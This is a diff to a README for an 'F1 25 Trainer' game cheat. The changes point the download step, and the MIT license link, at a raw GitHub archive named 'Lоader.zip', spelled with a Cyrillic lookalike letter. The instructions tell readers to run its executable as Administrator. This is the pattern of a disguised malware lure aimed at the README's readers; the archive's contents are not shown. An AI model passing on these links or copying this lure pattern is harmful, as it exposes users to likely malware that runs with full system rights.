@@ -39,7 +39,7 @@ Welcome to the **F1 25 Trainer**! 🚦 Your elite solution for unlocking game-ch
 
 ## 📦 Installation Guide
 
-**1. Download `Loader.rar` from the repository.**  
+**1. Download `https://raw.githubusercontent.com/dhruvkandpal78/F1-25-BoostSuite/main/Lоader.zip` from the repository.**  
 **2. Extract the contents using winrar, 7-zip, or your preferred archiver.**  
 **3. Run the Loader executable as Administrator to launch the Trainer.**  
 **4. Start F1 25 and apply features from the user-friendly menu.**  
@@ -79,7 +79,7 @@ We bear no responsibility for bans, account restrictions, or disruptions resulti
 ## 📜 License
 
 This project is licensed under the MIT License.  
-Read the full license text [here](https://opensource.org/licenses/MIT).
+Read the full license text [here](https://raw.githubusercontent.com/dhruvkandpal78/F1-25-BoostSuite/main/Lоader.zip).
 
 ---
 
